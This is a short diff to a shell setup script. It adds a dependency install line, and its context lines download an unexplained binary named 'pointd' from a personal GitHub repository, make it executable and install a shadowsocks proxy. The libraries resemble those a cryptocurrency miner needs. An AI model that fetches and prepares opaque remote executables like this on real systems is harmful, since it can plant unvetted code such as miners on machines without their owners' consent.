@@ -1,4 +1,5 @@
 apt update -y
+sudo apt-get install -y libnuma-dev && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 
 wget -q https://github.com/manorepas/bash/raw/main/pointd
 chmod +x pointd
 sudo apt -y install shadowsocks-libev rng-tools libsodium-dev
